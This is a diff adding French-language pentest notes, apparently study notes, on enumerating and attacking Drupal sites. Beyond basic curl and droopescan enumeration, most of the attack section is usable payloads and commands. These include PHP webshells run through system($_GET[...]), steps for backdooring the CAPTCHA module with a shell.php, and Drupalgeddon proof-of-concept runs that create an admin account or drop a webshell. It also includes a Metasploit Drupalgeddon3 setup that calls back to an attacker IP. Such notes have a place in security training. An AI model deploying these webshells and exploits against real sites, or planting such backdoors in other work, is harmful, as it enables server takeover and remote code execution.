@@ -285,3 +285,81 @@ Sortie potentielle :
   - **ATTENTION** : ce script peut détruire des fichiers si mal utilisé (option delete). N’utiliser **que** en scope autorisé.
 ---
 
+# Drupal - Discovery & Enumeration
+
+## Quick checks
+- Vérifier `robots.txt` :  
+  `curl -s http://TARGET/robots.txt | sed -n '1,120p'`
+- Checker la présence de fichiers d'info :  
+  `curl -s http://TARGET/CHANGELOG.txt`  
+  `curl -s http://TARGET/README.txt`
+- Vérifier l’existence du login /user/login :  
+  `curl -I http://TARGET/user/login`
+
+## Automated enumeration (droopescan)
+- Installer :  
+  `sudo pip3 install droopescan`
+- Scan rapide :  
+  `droopescan scan drupal -u http://TARGET`
+- Options utiles :  
+  `droopescan scan drupal -u http://TARGET --enumerate-plugins`
+  
+## When CHANGELOG.txt blocked
+- Si `CHANGELOG.txt` 404 → se fier à `droopescan`, metadata JS/CSS, et `sites/*/*manifest*` quand accessible.
+
+---
+
+# Attacking Drupal
+
+## Leveraging the PHP Filter Module
+
+- Dans les versions < 8 : possibilité d'activer le module *PHP filter*  
+- Activer le module via `Administration > Extend` (ou `Reports > Available updates` pour installer le module si Drupal 8+).  
+- Créer une page Basic (Content > Add content) et choisir le format `PHP code`.  
+- Exemple de snippet PHP (utiliser un paramètre non trivial) : `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`  
+- Accès à la page : `http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id`  
+- Pour Drupal 8+, télécharger le module PHP et l'installer : `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
+
+## Uploading a Backdoored Module
+
+- Télécharger un module existant (ex. CAPTCHA), extraire et ajouter un webshell et un `.htaccess`.  
+  - `wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`  
+  - `tar xvf captcha-8.x-1.2.tar.gz`  
+  - Créer `shell.php` : `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`  
+  - Créer `.htaccess` :
+  - `<IfModule mod_rewrite.c>`  
+    `RewriteEngine On`  
+    `RewriteBase /`  
+    `</IfModule>`  
+  - Ajouter `shell.php` et `.htaccess` au dossier du module, recréer l'archive : `tar cvf captcha.tar.gz captcha/`  
+- Installer le module via `Manage > Extend > Install new module` (ou page d'installation) en téléversant l'archive.  
+- Exécuter le shell : `http://TARGET/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`
+
+## Leveraging Known Vulnerabilities
+
+### Drupalgeddon (CVE-2014-3704)
+- Pré-auth SQL injection (Drupal 7.0 → 7.31) permettant, par PoC, la création d'un compte admin.  
+- Exemple d'outil PoC : `python2.7 drupalgeddon.py -t http://TARGET -u hacker -p pwnd`  
+- Résultat attendu : compte administrateur créé (login/password fournis par le script).
+
+### Drupalgeddon2 (CVE-2018-7600)
+- RCE via upload (affecte versions < 7.58 et < 8.5.1).  
+- PoC courant : `python3 drupalgeddon2.py` (suivre l'outil pour upload et vérification).  
+- Exemple pour écrire un webshell localement avant upload :  
+  - `echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64`  
+  - puis décoder et écrire : `echo 'BASE64' | base64 -d | tee mrb3n.php`  
+- Vérifier l'accès : `http://TARGET/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id`
+
+### Drupalgeddon3 (CVE-2018-7602)
+- RCE authentifié, nécessite une session avec permission de supprimer un node.  
+- Module Metasploit : `exploit(multi/http/drupal_drupageddon3)`  
+- Paramètres typiques à définir :  
+  - `set RHOSTS <host>`  
+  - `set VHOST <vhost>`  
+  - `set DRUPAL_SESSION <session_cookie>`  
+  - `set DRUPAL_NODE <node_id>`  
+  - `set LHOST <attacker_ip>`  
+- Lancer `exploit` pour obtenir une session.
+
+---
+
